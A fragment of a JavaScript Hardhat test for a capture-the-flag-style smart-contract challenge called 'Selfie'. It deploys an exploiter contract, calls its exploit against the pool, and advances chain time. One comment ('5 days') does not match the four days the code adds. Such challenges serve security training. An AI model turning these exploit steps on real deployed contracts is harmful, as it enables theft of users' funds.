...
describe('[Challenge] Selfie', function () {
    ...
    it('Execution', async function () {
        ...
        let exploiter = await (
            await ethers.getContractFactory('SelfieExploiter', deployer)
        ).deploy();
        let actionId = (await exploiter.exploit(pool.address, player.address))
            .value;
        await ethers.provider.send('evm_increaseTime', [4 * 24 * 60 * 60]); // 5 days
